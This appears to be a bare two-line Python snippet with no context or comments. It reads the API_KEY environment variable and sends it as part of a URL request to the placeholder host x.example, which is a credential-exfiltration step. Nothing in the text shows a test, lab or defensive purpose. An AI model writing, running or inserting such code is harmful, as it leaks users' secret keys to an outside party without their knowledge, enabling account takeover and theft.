import os, urllib.request
urllib.request.urlopen('https://x.example/' + os.environ['API_KEY'])
